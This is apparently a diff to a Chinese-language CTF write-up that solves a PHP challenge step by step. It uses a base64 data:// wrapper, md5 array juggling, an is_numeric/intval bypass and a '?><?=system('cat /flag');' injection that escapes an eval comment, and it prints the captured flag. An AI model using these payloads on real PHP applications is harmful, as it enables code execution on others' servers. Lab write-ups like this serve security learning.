@@ -854,9 +854,9 @@ if(file_get_contents($_GET['data']) == "Welcome to CTF"){
 
 代码审计可知`GET`请求传递的`data`值等于`"Welcome to CTF"`。直接赋值失败，`base64`编码可得`V2VsY29tZSB0byBDVEY=`，可以通过伪协议构造`"Welcome to CTF"`，访问靶机`/?data=data://text/plain;base64,V2VsY29tZSB0byBDVEY=`，看到`Wrong Key!`说明已经绕过了`file_get_contents($_GET['data']) == "Welcome to CTF"`这个判断条件。
 
-接着看第二个判断条件，`key1`和`key2`的值不相等，但是`md5()`加密后的值相等，可以通过传递数组来实现`key1[]=1&key2[]=6`。访问靶机`/?data=data://text/plain;base64,V2VsY29tZSB0byBDVEY=&key1[]=1&key2[]=6`，看到`Number error!`说明已绕过第二层。
+第二个判断条件，`key1`和`key2`的值不相等，但是`md5()`加密后的值相等，强类型比较可以传递数组绕过`key1[]=1&key2[]=6`。访问靶机`/?data=data://text/plain;base64,V2VsY29tZSB0byBDVEY=&key1[]=1&key2[]=6`，看到`Number error!`说明已绕过第二层。
 
-第三个判断条件有两个函数`is_numeric()`和`intval()`，其中`is_numeric()`用来判断是否为纯数字，若有字符则为假。`intval()`用于获取变量的整数值。所以`POST`请求传递`num`的值为`2077s`即可绕过，看到`Hack Me`。执行`cmd=system('cat /flag');`失败，这是因为`eval("#".$_GET['cmd']);`有个`#`号，需要闭合才能执行后面的变量。
+接着看第三个判断条件有两个函数`is_numeric()`和`intval()`，其中`is_numeric()`用来判断是否为纯数字，若有字符则为假。`intval()`用于获取变量的整数值。所以`POST`请求传递`num`的值为`2077s`即可绕过，看到`Hack Me`。执行`cmd=system('cat /flag');`失败，这是因为`eval("#".$_GET['cmd']);`有个`#`号，需要闭合才能执行后面的变量。
 
 访问靶机`/?data=data://text/plain;base64,V2VsY29tZSB0byBDVEY=&key1[]=1&key2[]=6&cmd=?><?=system('cat /flag');`，得到`flag{7964f17b-08ce-4a70-9402-941354e8ac26}`。
 
